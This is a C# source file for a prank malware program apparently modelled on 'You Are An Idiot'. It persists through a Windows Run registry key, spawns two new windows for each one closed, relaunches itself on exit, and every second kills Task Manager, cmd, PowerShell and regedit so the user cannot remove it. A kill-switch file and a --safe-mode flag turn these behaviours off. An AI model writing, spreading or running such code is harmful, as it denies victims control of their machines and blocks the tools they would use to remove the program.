
using System.Diagnostics;
using System.IO;
using System.Windows;

namespace youareanidiot;

/// <summary>
/// Interaction logic for App.xaml
/// </summary>
public partial class App : Application
{
    private const string KillSwitchFileName = "iamanidiot.txt";
    public bool IsSessionEnding = false;
    
    public const bool DoResurrectWindows = true; // Resurrect windows after they are closed
    public const int ResurrectedWindowsPerOneDead = 2;
    
    public const bool DoRestoreWindows = true; // Restore window count when executable is re-run
    
    public const bool DoRelaunchAfterReboot = true; // Relaunch executable after OS reboot
    private const string AutoLaunchRegistryKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    private const string AutoLaunchRegistryValueName = "Oh_hello_there";

    public const bool DoKillDisallowedProcesses = true; // Kill task manager, cmd, etc...
    private static readonly string[] DisallowedProcesses = [ "Taskmgr", "Cmd", "Powershell", "regedit" ];
    
    protected override void OnStartup(StartupEventArgs e)
    {
        base.OnStartup(e);
        
        bool killSwitchActive = IsKillSwitchActive();
        bool isAutoRunEnabled = HasAutoRunRegistryEntry();
        int lastWindowCount = GetWindowCount();

        // Advertise safe mode
        if (killSwitchActive)
        {
            Console.WriteLine("[[ PROCESS IS RUNNING IN SAFE MODE ]]");
            Console.WriteLine("[[ Will not resurrect windows, restart when exited or after reboot. ]]");
        }

        // Add/remove autolaunch entry in registry according to configuration/kill-switch
        if (DoRelaunchAfterReboot && !isAutoRunEnabled && !killSwitchActive) { AddAutoRunRegistryEntry(); }
        else if ((!DoRelaunchAfterReboot || killSwitchActive) && isAutoRunEnabled) { RemoveAutoRunRegistryEntry(); }

        // Spawn the main window/restore previous window count
        var mainWindow = new MainWindow();
        mainWindow.Show();
        
        // Restore previous windows/reset count if disabled or kill-switched
        if (DoRestoreWindows && lastWindowCount > 1 && !killSwitchActive)
        {
            SpawnWindows(lastWindowCount -1); // >1 and -1 accounts for the window that gets spawned regardless
            Console.WriteLine($"Restored {lastWindowCount} windows.");
        }
        if (!DoRestoreWindows || killSwitchActive) { ResetWindowCount(); } // If restoring windows is disabled or kill-switch is active, reset window count
        else if (lastWindowCount == 0) { IncreaseWindowCount(); } // Otherwise, if last window count is 0, count the startup one. Otherwise, the startup window is included in the last count
        
        // Monitor and kill disallowed processes
        if (DoKillDisallowedProcesses)
        { _ = RunProcessKillerAsync(); }
    }
    
    // Kill-switch
    public static bool IsKillSwitchActive()
    {
        return
            File.Exists(Path.Combine(Path.GetDirectoryName(Environment.ProcessPath) ?? "", KillSwitchFileName)) // Kill-switch file exists
            || Environment.GetCommandLineArgs().Contains("--safe-mode"); // Executable was explicitly run in safe mode
    }

    // Window logic
    
    public void AWindowWasClosed()
    {
        if (!DoResurrectWindows || IsKillSwitchActive())
        {
            Console.WriteLine("Window was closed, but back-off conditions are met or executable is configured to not resurrect windows.");
            return;
        }

        Console.WriteLine($"Shouldn't have closed that! Spawning {ResurrectedWindowsPerOneDead} new windows...");
        SpawnWindows(ResurrectedWindowsPerOneDead);
        if (DoRestoreWindows && !((App) Current).IsSessionEnding) { IncreaseWindowCount(ResurrectedWindowsPerOneDead - 1); } // -1 accounts for the window that was just closed
    }
    public static void SpawnWindows(int count = 1)
    {
        for (var i = 0; i < count; i++)
        {
            var andAnotherOne = new MainWindow();
            andAnotherOne.Show();
        }
    }
    
    
    // Kill threat processes
    
    private async Task RunProcessKillerAsync()
    {
        while (true)
        {
            KillDisallowedProcesses();
            await Task.Delay(1000);
        }
    }
    private static void KillDisallowedProcesses()
    {
        var candidateProcesses = new List<Process>();
        foreach (var targetProcessName in DisallowedProcesses) 
        { candidateProcesses.AddRange(Process.GetProcessesByName(targetProcessName)); }

        if (candidateProcesses.Count <= 0)
        { return; }

        if (IsKillSwitchActive())
        {
            Console.WriteLine("Found candidate processes, but kill-switch is active!");
            return;
        }

        Console.WriteLine($"Found {candidateProcesses.Count} candidate process(es). It's kill or be killed!");
            
        foreach (var candidateProcess in candidateProcesses)
        {
            try
            {
                candidateProcess.Kill();
                Console.WriteLine($"Killed process \"{candidateProcess.ProcessName}\" :)");
            }
            catch (Exception e)
            { Console.WriteLine($"Could not kill process \"{candidateProcess.ProcessName}\" ({candidateProcess.Id}): {e}"); }
        }
    }

    // On graceful exit, just restart
    protected override void OnExit(ExitEventArgs e)
    {
        base.OnExit(e);

        if (IsKillSwitchActive())
        {
            Console.WriteLine("Process exited, but kill-switch is active. Will not restart.");
            return;
        }
        
        Process.Start(Environment.ProcessPath!);
    }
}